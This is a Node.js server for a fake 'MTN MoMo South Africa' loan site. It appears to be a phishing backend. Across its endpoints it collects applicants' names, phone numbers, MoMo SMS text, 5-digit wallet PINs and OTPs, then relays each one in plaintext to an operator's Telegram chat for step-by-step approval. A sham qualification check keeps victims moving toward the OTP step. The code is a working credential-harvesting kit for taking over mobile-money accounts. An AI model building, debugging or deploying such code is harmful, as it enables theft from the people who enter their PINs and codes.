// ============================================================
// server.js – MTN MoMo South Africa
// Fixed Telegram webhook + Qualification after PIN
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

// ─── Config ───
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

console.log('═══════════════════════════════════════');
console.log('🚀 Server starting...');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '... (len ' + BOT_TOKEN.length + ')' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('═══════════════════════════════════════');

// ─── Data Store ───
const applications = {};
const DATA_DIR = path.join(__dirname, '../data');
const DATA_FILE = path.join(DATA_DIR, 'applications.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function saveApps() {
    try { fs.writeFileSync(DATA_FILE, JSON.stringify({ applications, timestamp: new Date().toISOString() }, null, 2)); }
    catch (e) { console.error('Save error:', e.message); }
}
function loadApps() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            Object.assign(applications, parsed.applications || {});
            console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
        }
    } catch (e) { console.error('Load error:', e.message); }
}

// ─── HTML Helpers ───
function esc(t) {
    if (t === null || t === undefined) return '';
    return String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<code>${esc(c)}</code>`;
}
function block(t) {
    const c = (t === null || t === undefined) ? '' : String(t).trim();
    return `<pre>${esc(c)}</pre>`;
}

// ─── Telegram Send ───
async function tgSend(text, buttons = null) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('❌ tgSend: missing token or chat ID');
        return { ok: false, error: 'Missing credentials' };
    }
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };

    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ Telegram sent (msg_id: ${result.result?.message_id})`);
        else console.error(`❌ Telegram rejected: ${result.description} (code ${result.error_code})`);
        return result;
    } catch (e) {
        console.error('❌ Telegram fetch error:', e.message);
        return { ok: false, error: e.message };
    }
}

function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTIC ENDPOINTS
// ═══════════════════════════════════════════════════════════

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), applications: Object.keys(applications).length });
});

app.get('/api/telegram-debug', async (req, res) => {
    const result = {
        tokenSet: !!BOT_TOKEN,
        tokenLength: BOT_TOKEN ? BOT_TOKEN.length : 0,
        tokenHasColon: BOT_TOKEN ? BOT_TOKEN.includes(':') : false,
        chatIdSet: !!CHAT_ID,
        chatId: CHAT_ID || 'MISSING'
    };
    try {
        const me = await fetch(`${TG_API}/getMe`);
        result.getMe = await me.json();
    } catch (e) { result.getMeError = e.message; }
    try {
        result.testSend = await tgSend(`🧪 <b>Test</b>\n⏰ ${new Date().toISOString()}\n\nBot is working!`);
    } catch (e) { result.testSendError = e.message; }
    res.json(result);
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK — ALWAYS returns 200, never 4xx
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    // ── IMMEDIATELY respond 200 — NEVER any other status code ──
    res.status(200).send('ok');

    // Log everything
    console.log('═══════════════════════════════════════');
    console.log('🔔 WEBHOOK HIT:', new Date().toISOString());
    console.log('   IP:', req.headers['x-forwarded-for'] || req.ip);
    console.log('   UA:', req.headers['user-agent']);
    console.log('   Body keys:', req.body ? Object.keys(req.body) : 'none');

    try {
        // ── Callback Query (YES/NO button taps) ──
        if (req.body && req.body.callback_query) {
            const q = req.body.callback_query;
            console.log('🔘 Callback:', q.data);

            // Answer callback (fire-and-forget)
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
            }).catch(e => console.error('answerCallbackQuery:', e.message));

            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) { console.log(`⚠️ App ${data.id} not found`); return; }

                const step = data.s;
                const approved = data.a === 'Y';

                if (app_[step] !== 'pending') {
                    console.log(`⚠️ ${step} not pending (current: ${app_[step]})`);
                    return;
                }

                app_[step] = approved ? 'approved' : 'rejected';
                app_.updatedAt = new Date().toISOString();
                saveApps();
                console.log(`✅ ${step} → ${app_[step]} for ${data.id}`);

                tgSend(
                    `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(data.id)}\n` +
                    `📋 Step: <b>${step.toUpperCase()}</b>\n` +
                    `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}`
                );
            } catch (parseError) {
                console.error('❌ Callback parse error:', parseError.message);
            }
            return;
        }

        // ── Text Commands ──
        if (req.body && req.body.message && req.body.message.text) {
            const text = req.body.message.text.trim();
            const chatId = req.body.message.chat.id.toString();
            console.log(`💬 Command: ${text} from chat ${chatId}`);

            if (chatId !== CHAT_ID.toString()) {
                console.log(`⚠️ Unauthorized chat: ${chatId}`);
                return;
            }

            if (text === '/start' || text === '/help') {
                tgSend(
                    `🤖 <b>MTN MoMo Loan Bot</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📊 /stats — Statistics\n` +
                    `📋 /list — Recent applications\n` +
                    `🔍 /search [ID] — Find application\n` +
                    `⏳ /pending — Pending approvals\n\n` +
                    `✅ Bot is working!`
                );
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pending = Object.values(applications).filter(a =>
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending'
                ).length;
                const completed = Object.values(applications).filter(a => a.otp === 'approved').length;
                tgSend(
                    `📊 <b>STATISTICS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📝 Total: <b>${total}</b>\n⏳ Pending: ${pending}\n✅ Completed: ${completed}`
                );
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 No applications.'); return; }
                let msg = '📋 <b>LAST 10</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += `\n${i+1}. 🆔 ${code(id)}\n   👤 ${esc(a.firstName)} ${esc(a.lastName)}\n   💰 R ${(a.loanAmount||0).toLocaleString()}\n   📌 App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp}\n`;
                });
                tgSend(msg);
            } else if (text.startsWith('/search ')) {
                const id = text.replace('/search ', '').trim().toUpperCase();
                const a = applications[id];
                if (!a) { tgSend(`❌ Not found: ${code(id)}`); return; }
                tgSend(
                    `🔍 <b>DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🆔 ${code(id)}\n👤 ${esc(a.firstName)} ${esc(a.lastName)}\n` +
                    `📱 ${code('+27' + a.phone)}\n💰 <b>R ${(a.loanAmount||0).toLocaleString()}</b>\n\n` +
                    `📋 App: ${a.application}\n📨 SMS: ${a.sms}\n🔐 PIN: ${a.pin}\n🔑 OTP: ${a.otp}\n📊 Tx: R ${(a.monthlyTransactions||0).toLocaleString()}`
                );
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(([_, a]) =>
                    a.application === 'pending' || a.sms === 'pending' ||
                    a.pin === 'pending' || a.otp === 'pending'
                );
                if (!pending.length) { tgSend('✅ No pending.'); return; }
                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
                pending.slice(0, 10).forEach(([id, a]) => {
                    const steps = [];
                    if (a.application === 'pending') steps.push('App');
                    if (a.sms === 'pending') steps.push('SMS');
                    if (a.pin === 'pending') steps.push('PIN');
                    if (a.otp === 'pending') steps.push('OTP');
                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName)} ${esc(a.lastName)}\n💰 R ${(a.loanAmount||0).toLocaleString()}\n📋 ${steps.join(', ')}\n`;
                });
                tgSend(msg);
            }
        }
    } catch (e) {
        console.error('❌ Webhook error:', e.message, e.stack);
    }
});

// ═══════════════════════════════════════════════════════════
// LOAN FLOW ENDPOINTS
// ═══════════════════════════════════════════════════════════

// Submit Application
app.post('/api/send-application', (req, res) => {
    try {
        const data = req.body.applicationData;
        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;
        if (!applicationId) return res.status(400).json({ ok: false, error: 'Missing application ID' });

        applications[applicationId] = {
            ...data,
            application: 'pending',
            sms: 'idle',
            pin: 'idle',
            qualification: 'idle',
            otp: 'idle',
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };
        saveApps();
        console.log(`📝 Submitted: ${applicationId}`);

        askApproval(
            `📋 <b>NEW LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ID: ${code(applicationId)}\n` +
            `👤 ${esc(firstName)} ${esc(lastName)}\n` +
            `📱 Phone: ${code('+27' + phone)}\n` +
            `💰 Amount: <b>R ${loanAmount.toLocaleString()}</b>\n` +
            `📅 Term: ${esc(loanTerm)}\n\n` +
            `✅ <b>Approve to allow SMS step?</b>`,
            'application', applicationId
        );

        res.json({ ok: true, applicationId, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Submit SMS
app.post('/api/send-momo-message', (req, res) => {
    try {
        const { applicationId, phone, momoMessage } = req.body.momoData;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.application !== 'approved') return res.status(400).json({ ok: false, error: 'Application not approved yet' });

        app_.smsMessage = String(momoMessage).trim();
        app_.sms = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `📨 <b>SMS VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `📱 ${code('+27' + phone)}\n\n` +
            `📩 <b>SMS:</b>\n${block(momoMessage)}\n\n` +
            `✅ <b>Approve to allow PIN step?</b>`,
            'sms', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Submit PIN
app.post('/api/send-pin', (req, res) => {
    try {
        const { applicationId, pin } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.sms !== 'approved') return res.status(400).json({ ok: false, error: 'SMS not approved yet' });

        const cleanPin = String(pin || '').trim();
        if (!/^\d{5}$/.test(cleanPin)) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits' });

        app_.pinValue = cleanPin;
        app_.pin = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `🔐 <b>PIN VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `🔢 PIN: ${code(cleanPin)}\n\n` +
            `✅ <b>Approve so user can verify MoMo activity?</b>`,
            'pin', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Qualification Check (after PIN, before OTP) ───
app.post('/api/check-qualification', (req, res) => {
    try {
        const { applicationId, monthlyTransactions } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved yet' });

        const volume = Number(monthlyTransactions) || 0;
        if (volume < 0) return res.status(400).json({ ok: false, error: 'Invalid volume' });
        if (volume > 10000000) return res.status(400).json({ ok: false, error: 'Exceeds limits' });

        const required = Math.ceil(app_.loanAmount * 0.20);
        const qualifies = volume >= required && volume >= 500;
        const shortfall = Math.max(0, required - volume);
        const coveragePercent = +((volume / app_.loanAmount) * 100).toFixed(2);
        const maxQualifyingLoan = Math.floor(volume / 0.20);

        app_.monthlyTransactions = volume;
        app_.qualificationRequired = required;
        app_.qualificationCoverage = coveragePercent;
        app_.qualification = qualifies ? 'qualified' : 'unqualified';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        console.log(`📊 Qualification for ${applicationId}: ${app_.qualification} (${coveragePercent}%)`);

        // Send notification to admin
        tgSend(
            `${qualifies ? '✅' : '⚠️'} <b>QUALIFICATION ${qualifies ? 'PASSED' : 'FAILED'}</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n` +
            `👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `💰 Loan: <b>R ${app_.loanAmount.toLocaleString()}</b>\n` +
            `📊 Monthly Tx: R ${volume.toLocaleString()}\n` +
            `🎯 Required (20%): R ${required.toLocaleString()}\n` +
            (qualifies
                ? `📈 Coverage: <b>${coveragePercent}%</b>`
                : `❌ Shortfall: R ${shortfall.toLocaleString()}`)
        );

        res.json({
            ok: true,
            qualifies,
            required,
            actual: volume,
            shortfall,
            coveragePercent,
            maxQualifyingLoan,
            reason: qualifies
                ? `Your R ${volume.toLocaleString()} monthly volume covers the R ${required.toLocaleString()} requirement (${coveragePercent}%).`
                : `Your monthly volume of R ${volume.toLocaleString()} covers ${coveragePercent}% of your R ${app_.loanAmount.toLocaleString()} loan.`
        });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Submit OTP
app.post('/api/send-otp', (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.pin !== 'approved') return res.status(400).json({ ok: false, error: 'PIN not approved yet' });
        if (app_.qualification !== 'qualified') return res.status(400).json({ ok: false, error: 'Qualification not passed' });

        const cleanOtp = String(otp || '').trim();
        if (!/^\d{4}$/.test(cleanOtp)) return res.status(400).json({ ok: false, error: 'OTP must be 4 digits' });

        app_.otpValue = cleanOtp;
        app_.otp = 'pending';
        app_.updatedAt = new Date().toISOString();
        saveApps();

        askApproval(
            `🔑 <b>OTP VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🆔 ${code(applicationId)}\n👤 ${esc(app_.firstName)} ${esc(app_.lastName)}\n` +
            `🔢 OTP: ${code(cleanOtp)}\n\n` +
            `✅ <b>Approve to complete the loan?</b>`,
            'otp', applicationId
        );

        res.json({ ok: true, status: 'pending' });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Poll status
app.get('/api/status/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['application', 'sms', 'pin', 'qualification', 'otp'].includes(step))
        return res.status(400).json({ ok: false, error: 'Invalid step' });
    res.json({ ok: true, status: app_[step] || 'idle', applicationId, step });
});

// Full status
app.get('/api/status/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    res.json({
        ok: true,
        application: app_.application,
        sms: app_.sms,
        pin: app_.pin,
        qualification: app_.qualification,
        otp: app_.otp
    });
});

// Resend SMS
app.post('/api/resend-sms/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.sms = 'idle';
    app_.smsMessage = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

// Resend OTP
app.post('/api/resend-otp', (req, res) => {
    const { applicationId } = req.body;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    app_.otp = 'idle';
    app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    tgSend(`🔄 <b>OTP RESENT</b>\n🆔 ${code(applicationId)}`);
    res.json({ ok: true });
});

// Retry step
app.post('/api/retry/:applicationId/:step', (req, res) => {
    const { applicationId, step } = req.params;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    if (!['sms', 'pin', 'otp'].includes(step)) return res.status(400).json({ ok: false, error: 'Invalid step' });

    app_[step] = 'idle';
    if (step === 'sms') app_.smsMessage = null;
    if (step === 'pin') { app_.pinValue = null; app_.qualification = 'idle'; }
    if (step === 'otp') app_.otpValue = null;
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

// Rejection info
app.get('/api/rejection-info/:applicationId', (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });

    let rejectedStep = null, errorMessage = '';
    if (app_.application === 'rejected') { rejectedStep = 'application'; errorMessage = 'Application was rejected.'; }
    else if (app_.sms === 'rejected') { rejectedStep = 'sms'; errorMessage = 'Your SMS was rejected.'; }
    else if (app_.pin === 'rejected') { rejectedStep = 'pin'; errorMessage = 'Your PIN was rejected.'; }
    else if (app_.otp === 'rejected') { rejectedStep = 'otp'; errorMessage = 'Your OTP was rejected.'; }

    res.json({ ok: true, rejectedStep, errorMessage });
});

// Serve frontend
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// Boot
loadApps();
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`   → http://localhost:${PORT}`);
    console.log(`   → Health: http://localhost:${PORT}/health`);
    console.log(`   → Debug: http://localhost:${PORT}/api/telegram-debug\n`);
});
